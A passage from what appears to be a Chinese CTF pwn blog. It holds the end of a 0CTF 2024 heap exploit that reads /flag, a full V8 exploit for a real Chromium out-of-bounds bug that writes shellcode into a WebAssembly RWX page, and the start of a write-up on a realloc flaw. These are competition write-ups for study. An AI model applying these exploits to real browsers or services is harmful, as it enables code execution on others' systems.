class="line">        dele_ip(h2ip(<span class="number">9</span> * <span class="number">8</span> * <span class="number">8</span> + i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># change_addr = libc_base + 0x21b680 + 0x100 + 0x70</span></span><br><span class="line"><span class="comment"># change_byte = f&quot;&#123;change_addr:048b&#125;&quot;</span></span><br><span class="line"><span class="comment"># change_byte = change_byte[::-1]</span></span><br><span class="line"><span class="comment"># print(change_byte)</span></span><br><span class="line"><span class="comment"># for i in range(len(change_byte)):</span></span><br><span class="line"><span class="comment">#     if change_byte[i] == &#x27;1&#x27;:</span></span><br><span class="line"><span class="comment">#         add_ip(h2ip(64 + i))</span></span><br><span class="line"><span class="comment">#     else:</span></span><br><span class="line"><span class="comment">#         dele_ip(h2ip(64 + i))</span></span><br><span class="line"></span><br><span class="line">s = h2ip(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># sla(input_after_this, b&#x27;6&#x27;)</span></span><br><span class="line">create_set(s, cal_size(<span class="number">0x100</span>, start=ip2h(s)))</span><br><span class="line"><span class="comment"># dele_ip(0, 0xD8 * 8)</span></span><br><span class="line"></span><br><span class="line">change_addr = libc.sym.system</span><br><span class="line">change_byte = <span class="string">f&quot;<span class="subst">&#123;change_addr:048b&#125;</span>&quot;</span></span><br><span class="line">change_byte = change_byte[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(change_byte)):</span><br><span class="line">    <span class="keyword">if</span> change_byte[i] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        add_ip(h2ip(<span class="number">8</span> * <span class="number">0x28</span> + i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dele_ip(h2ip(<span class="number">8</span> * <span class="number">0x28</span> + i))</span><br><span class="line"></span><br><span class="line">change_addr = stderr - <span class="number">0x40</span></span><br><span class="line"><span class="comment"># change_addr = heap_base</span></span><br><span class="line">change_byte = <span class="string">f&quot;<span class="subst">&#123;change_addr:048b&#125;</span>&quot;</span></span><br><span class="line">change_byte = change_byte[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(change_byte)):</span><br><span class="line">    <span class="keyword">if</span> change_byte[i] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        add_ip(h2ip(<span class="number">8</span> * <span class="number">0xA0</span> + i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dele_ip(h2ip(<span class="number">8</span> * <span class="number">0xA0</span> + i))</span><br><span class="line"></span><br><span class="line">change_addr = libc.sym._IO_wfile_jumps - <span class="number">0x48</span> + <span class="number">0x28</span></span><br><span class="line">change_byte = <span class="string">f&quot;<span class="subst">&#123;change_addr:048b&#125;</span>&quot;</span></span><br><span class="line">change_byte = change_byte[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(change_byte)):</span><br><span class="line">    <span class="keyword">if</span> change_byte[i] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        add_ip(h2ip(<span class="number">8</span> * <span class="number">0xD8</span> + i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dele_ip(h2ip(<span class="number">8</span> * <span class="number">0xD8</span> + i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># change_addr = libc.sym._environ - 0x10</span></span><br><span class="line"><span class="comment"># change_byte = f&quot;&#123;change_addr:048b&#125;&quot;</span></span><br><span class="line"><span class="comment"># change_byte = change_byte[::-1]</span></span><br><span class="line"><span class="comment"># for i in range(len(change_byte)):</span></span><br><span class="line"><span class="comment">#     if change_byte[i] == &#x27;1&#x27;:</span></span><br><span class="line"><span class="comment">#         add_ip(h2ip(8 * 0x88 + i))</span></span><br><span class="line"><span class="comment">#     else:</span></span><br><span class="line"><span class="comment">#         dele_ip(h2ip(8 * 0x88 + i))</span></span><br><span class="line"></span><br><span class="line">change_addr = u64_ex(<span class="string">&#x27;  sh&#x27;</span>)</span><br><span class="line">launch_gdb(cmd)</span><br><span class="line">change_byte = <span class="string">f&quot;<span class="subst">&#123;change_addr:048b&#125;</span>&quot;</span></span><br><span class="line">change_byte = change_byte[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(change_byte)):</span><br><span class="line">    <span class="keyword">if</span> change_byte[i] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        add_ip(h2ip(+i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dele_ip(h2ip(+i))</span><br><span class="line"></span><br><span class="line">create_set(s, cal_size(<span class="number">0x70</span>, start=ip2h(s)))</span><br><span class="line">dele_ip(<span class="number">0</span>, <span class="number">0x8</span> * <span class="number">8</span>)</span><br><span class="line">create_set(s, cal_size(<span class="number">0x500</span>, start=ip2h(s)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># change_addr = libc.sym.exit</span></span><br><span class="line"><span class="comment"># change_byte = f&quot;&#123;change_addr:048b&#125;&quot;</span></span><br><span class="line"><span class="comment"># change_byte = change_byte[::-1]</span></span><br><span class="line"><span class="comment"># for i in range(len(change_byte)):</span></span><br><span class="line"><span class="comment">#     if change_byte[i] == &#x27;1&#x27;:</span></span><br><span class="line"><span class="comment">#         add_ip(h2ip(64 + i))</span></span><br><span class="line"><span class="comment">#     else:</span></span><br><span class="line"><span class="comment">#         dele_ip(h2ip(64 + i))</span></span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;cat /flag\x00&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;cat /flag\x00&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;cat /flag\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>最后非常感谢沪✌ZianTT，由于人在北京，和上海有着物理距离上的遥远，和靶机的交互一卡一卡的，导致远程一直超时，换了vps也是超时，最后优化了exp，让沪✌跑脚本才打通了。</p>
<p>当然还得感谢圈爷，io板子的神！！！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202412/24/0ctf-2024/image-20241224091015590.png"
                      alt="image-20241224091015590"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202412/24/0ctf-2024/image-20241224091019226.png"
                      alt="image-20241224091019226"
                ></p>
<p>也是体验了一把前五的感觉</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>0ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>PlaidCTF-roll-a-d8</title>
    <url>/202412/03/PlaidCTF-roll-a-d8/</url>
    <content><![CDATA[<h1 id="PlaidCTF-roll-a-d8"><a href="#PlaidCTF-roll-a-d8" class="headerlink" title="PlaidCTF-roll-a-d8"></a>PlaidCTF-roll-a-d8</h1><p>该漏洞是一个真实的漏洞<a class="link"   href="https://bugs.chromium.org/p/chromium/issues/detail?id=821137" >Issue 821137<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>首先是利用POC造溢出，然后通过Function–&gt;shared_info-&gt;code-&gt;wasm function去读rwx段地址</p>
<p>最后写shellcode执行</p>
<p>debug编译出来的，数组溢出会有些小问题，最终还是得release</p>
<p>gc回收后，多个数组间的距离也会拉的很近，相对来说方便任意读写一点</p>
<p>exp</p>
<div class="code-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">const</span> dv = <span class="keyword">new</span> <span class="title class_">DataView</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> raw_buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> d_buf = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(raw_buf);</span><br><span class="line"><span class="keyword">var</span> l_buf = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(raw_buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">p64</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">arguments</span>.<span class="property">length</span> === <span class="number">1</span>) &#123;</span><br><span class="line">        l_buf[<span class="number">0</span>] = <span class="title class_">Number</span>(<span class="variable language_">arguments</span>[<span class="number">0</span>] &amp; (<span class="number">0xFFFFFFFF</span>));</span><br><span class="line">        l_buf[<span class="number">1</span>] = <span class="built_in">parseInt</span>((<span class="variable language_">arguments</span>[<span class="number">0</span>] - l_buf[<span class="number">0</span>]) / <span class="number">0x100000000</span>);</span><br><span class="line">        <span class="keyword">return</span> d_buf[<span class="number">0</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">arguments</span>.<span class="property">length</span> === <span class="number">2</span>) &#123;</span><br><span class="line">        l_buf[<span class="number">0</span>] = <span class="variable language_">arguments</span>[<span class="number">0</span>];</span><br><span class="line">        l_buf[<span class="number">1</span>] = <span class="variable language_">arguments</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">return</span> d_buf[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u64</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    d_buf[<span class="number">0</span>] = val;</span><br><span class="line">    <span class="keyword">return</span> l_buf[<span class="number">1</span>] * <span class="number">0x100000000</span> + l_buf[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u64_l</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    d_buf[<span class="number">0</span>] = val;</span><br><span class="line">    <span class="keyword">return</span> l_buf[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u64_h</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    d_buf[<span class="number">0</span>] = val;</span><br><span class="line">    <span class="keyword">return</span> l_buf[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">gc</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">log</span>(<span class="string">&quot;gc&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x1000000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">x</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> x.<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">printhex</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">arguments</span>.<span class="property">length</span> === <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`\u001b[32m[+]Hex: \u001b[0m0x<span class="subst">$&#123;<span class="variable language_">arguments</span>[<span class="number">0</span>].toString(<span class="number">16</span>)&#125;</span>`</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">arguments</span>.<span class="property">length</span> === <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`\u001b[32m[+]<span class="subst">$&#123;<span class="variable language_">arguments</span>[<span class="number">0</span>]&#125;</span>: \u001b[0m0x<span class="subst">$&#123;<span class="variable language_">arguments</span>[<span class="number">1</span>].toString(<span class="number">16</span>)&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">log</span>(<span class="params"></span>) &#123;</span><br><span class="line">    output = <span class="string">`\u001b[32m[+]<span class="subst">$&#123;<span class="variable language_">arguments</span>[<span class="number">0</span>]&#125;</span>\u001b[0m`</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        output += <span class="variable language_">arguments</span>[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(output);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">warn</span>(<span class="params"></span>) &#123;</span><br><span class="line">    output = <span class="string">`\u001b[31m[+]<span class="subst">$&#123;<span class="variable language_">arguments</span>[<span class="number">0</span>]&#125;</span>\u001b[0m`</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        output += <span class="variable language_">arguments</span>[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(output);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">farrdump</span>(<span class="params">float_arr, start, end</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = start; i &lt; end; i++) &#123;</span><br><span class="line">        <span class="title function_">printhex</span>(<span class="string">`arr[<span class="subst">$&#123;i&#125;</span>]`</span>, <span class="title function_">u64</span>(float_arr[i]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">iarrdump</span>(<span class="params">int_arr, start, end</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = start; i &lt; end; i++) &#123;</span><br><span class="line">        <span class="title function_">printhex</span>(<span class="string">`arr[<span class="subst">$&#123;i&#125;</span>]`</span>, int_arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arrayBuffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> shellcode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x2e</span>, <span class="number">0x67</span>, <span class="number">0x6d</span>, <span class="number">0x60</span>, <span class="number">0x66</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0x4</span>, <span class="number">0x24</span>, <span class="number">0x6a</span>, <span class="number">0x2</span>, <span class="number">0x58</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x99</span>, <span class="number">0xf</span>, <span class="number">0x5</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x7f</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xc6</span>, <span class="number">0x6a</span>, <span class="number">0x28</span>, <span class="number">0x58</span>, <span class="number">0x6a</span>, <span class="number">0x1</span>, <span class="number">0x5f</span>, <span class="number">0x99</span>, <span class="number">0xf</span>, <span class="number">0x5</span>]);</span><br><span class="line"><span class="comment">// open sendfile</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0x00</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x6D</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x85</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x60</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x7F</span>, <span class="number">0x03</span>, <span class="number">0x82</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x84</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x70</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x83</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x06</span>, <span class="number">0x81</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x91</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x06</span>, <span class="number">0x6D</span>, <span class="number">0x65</span>, <span class="number">0x6D</span>, <span class="number">0x6F</span>, <span class="number">0x72</span>, <span class="number">0x79</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x6D</span>, <span class="number">0x61</span>, <span class="number">0x69</span>, <span class="number">0x6E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0A</span>, <span class="number">0x8A</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x84</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x2A</span>, <span class="number">0x0B</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule);</span><br><span class="line"><span class="keyword">var</span> func = wasmInstance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> oobArray = [<span class="number">1.1</span>, <span class="number">2.2</span>];</span><br><span class="line"><span class="keyword">var</span> obj = [];</span><br><span class="line"><span class="keyword">var</span> data_buf = [];</span><br><span class="line"><span class="keyword">var</span> maxSize = <span class="number">1024</span> * <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Array</span>.<span class="property">from</span>.<span class="title function_">call</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123; <span class="keyword">return</span> oobArray &#125;, &#123;</span><br><span class="line">    [<span class="title class_">Symbol</span>.<span class="property">iterator</span>]: <span class="function"><span class="params">_</span> =&gt;</span> (</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">counter</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="title function_">next</span>(<span class="params"></span>) &#123;</span><br><span class="line">                <span class="keyword">let</span> result = <span class="variable language_">this</span>.<span class="property">counter</span>++;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">counter</span> &gt; maxSize) &#123;</span><br><span class="line">                    oobArray.<span class="property">length</span> = <span class="number">1</span>;</span><br><span class="line">                    oobArray[<span class="number">0</span>] = <span class="number">3.3</span>;</span><br><span class="line">                    data_buf.<span class="title function_">push</span>(<span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x100</span>));</span><br><span class="line">                    <span class="keyword">let</span> o = &#123; <span class="attr">mark</span>: <span class="number">1111222233334444</span>, <span class="attr">obj</span>: func &#125;;</span><br><span class="line">                    obj.<span class="title function_">push</span>(o);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> &#123; <span class="attr">done</span>: <span class="literal">true</span> &#125;;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> &#123; <span class="attr">value</span>: result, <span class="attr">done</span>: <span class="literal">false</span> &#125;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="title function_">gc</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_">log</span>(<span class="string">&quot;oobArray&quot;</span>);</span><br><span class="line">% <span class="title class_">DebugPrint</span>(oobArray);</span><br><span class="line"><span class="title function_">log</span>(<span class="string">&quot;func&quot;</span>);</span><br><span class="line">% <span class="title class_">DebugPrint</span>(func);</span><br><span class="line"><span class="title function_">log</span>(<span class="string">&quot;arrayBuffer&quot;</span>);</span><br><span class="line">% <span class="title class_">DebugPrint</span>(arrayBuffer);</span><br><span class="line"><span class="title function_">log</span>(<span class="string">&quot;data_buf&quot;</span>);</span><br><span class="line">% <span class="title class_">DebugPrint</span>(data_buf);</span><br><span class="line"><span class="title function_">log</span>(<span class="string">&quot;obj&quot;</span>);</span><br><span class="line">% <span class="title class_">DebugPrint</span>(obj);</span><br><span class="line"><span class="comment">// % SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">farrdump</span>(oobArray, <span class="number">0</span>, <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">heap = <span class="title function_">u64</span>(oobArray[<span class="number">5</span>]);</span><br><span class="line">obj_element = <span class="title function_">u64</span>(oobArray[<span class="number">0x2f</span>]);</span><br><span class="line"></span><br><span class="line"><span class="title function_">printhex</span>(<span class="string">&quot;heap&quot;</span>, heap);</span><br><span class="line"><span class="title function_">printhex</span>(<span class="string">&quot;obj_element&quot;</span>, obj_element);</span><br><span class="line"></span><br><span class="line">oobArray[<span class="number">5</span>] = <span class="title function_">p64</span>(obj_element - <span class="number">1</span>);</span><br><span class="line"><span class="title function_">log</span>(<span class="string">&quot;data_buf[0]&quot;</span>);</span><br><span class="line">% <span class="title class_">DebugPrint</span>(data_buf[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> float_arr1 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(data_buf[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> func_addr = <span class="title function_">u64</span>(float_arr1[<span class="number">4</span>]);</span><br><span class="line"><span class="title function_">printhex</span>(<span class="string">&quot;func_addr&quot;</span>, func_addr);</span><br><span class="line"></span><br><span class="line">oobArray[<span class="number">5</span>] = <span class="title function_">p64</span>(func_addr - <span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> float_arr2 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(data_buf[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> code_addr = <span class="title function_">u64</span>(float_arr2[<span class="number">6</span>]);</span><br><span class="line"><span class="title function_">printhex</span>(<span class="string">&quot;code_addr&quot;</span>, code_addr);</span><br><span class="line"></span><br><span class="line">oobArray[<span class="number">5</span>] = <span class="title function_">p64</span>(code_addr + <span class="number">0x71</span>);</span><br><span class="line"><span class="keyword">var</span> float_arr3 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(data_buf[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> rwx_addr = <span class="title function_">u64</span>(float_arr3[<span class="number">0</span>]);</span><br><span class="line"><span class="title function_">printhex</span>(<span class="string">&quot;rwx_addr&quot;</span>, rwx_addr);</span><br><span class="line"></span><br><span class="line">oobArray[<span class="number">5</span>] = <span class="title function_">p64</span>(rwx_addr);</span><br><span class="line"><span class="keyword">var</span> shellcode_arr = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(data_buf[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    shellcode_arr[i] = shellcode[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">% <span class="title class_">SystemBreak</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_">func</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>v8</tag>
      </tags>
  </entry>
  <entry>
    <title>WangDing-2024</title>
    <url>/202411/28/WangDing-2024/</url>
    <content><![CDATA[<h1 id="card-master"><a href="#card-master" class="headerlink" title="card_master"></a>card_master</h1><p>网鼎半决赛的一道pwn题</p>
<p>浅逆一下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202411/28/WangDing-2024/image-20241127145112800.png"
                      alt="image-20241127145112800"
                ></p>
<p>程序模拟的是一套扑克牌，可以随机洗牌打乱。</p>
<p>set功能可以设置扑克牌有几个花色，每个花色有几张牌等。</p>
<p>case 3 是show功能，可以打印出设置的卡牌参数，</p>
<p>shuffle是随机打乱牌序（洗牌）。</p>
<p>show_card则是展示出所有手牌。</p>
<p>其中存储牌参数的结构体如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000</span> <span class="class"><span class="keyword">struct</span> <span class="title">struct_a1</span> // <span class="title">sizeof</span>=</span><span class="number">0x28</span></span><br><span class="line"><span class="number">00000000</span> &#123;</span><br><span class="line"><span class="number">00000000</span>     _DWORD suit_size;</span><br><span class="line"><span class="number">00000004</span>     _DWORD card_num;</span><br><span class="line"><span class="number">00000008</span>     _QWORD shuffle_times;</span><br><span class="line"><span class="number">00000010</span>     _BYTE symble[<span class="number">16</span>];</span><br><span class="line"><span class="number">00000020</span>     _QWORD card;</span><br><span class="line"><span class="number">00000028</span> &#125;;</span><br></pre></td></tr></table></figure></div>

<h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>在set功能中，我们可以设置牌的花色个数和每个花色的牌数，还可以自定义花色的输出（默认是♥♠♦♣）。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *a1-&gt;symble == byte_202010 )</span><br><span class="line">  v5 = <span class="built_in">malloc</span>(<span class="number">4</span> * a1-&gt;suit_size);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  v5 = <span class="built_in">realloc</span>(*a1-&gt;symble, <span class="number">4</span> * a1-&gt;suit_size);</span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> ( v5 )</span><br><span class="line">&#123;</span><br><span class="line">  *a1-&gt;symble = v5;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;new suite set:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, *a1-&gt;symble, <span class="number">4</span> * a1-&gt;suit_size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>但symble是默认时，程序会调用malloc分配一块内存存储我们自定义的花色。第二次修改时就是调用realloc分配内存。</p>
<p>下方有一处判断<code>if ( v5 )</code>，但成功分配内存时，就更新结构体的symble指针，并读入数据。</p>
<p>回到realloc，查阅下源码，如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_realloc (<span class="type">void</span> *oldmem, <span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  INTERNAL_SIZE_T nb;         <span class="comment">/* padded request size */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *newp;             <span class="comment">/* chunk to return */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *(*hook) (<span class="type">void</span> *, <span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *) =</span><br><span class="line">    atomic_forced_read (__realloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(oldmem, bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> REALLOC_ZERO_BYTES_FREES</span></span><br><span class="line">  <span class="keyword">if</span> (bytes == <span class="number">0</span> &amp;&amp; oldmem != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __libc_free (oldmem); <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 调用了free</span></span><br><span class="line">    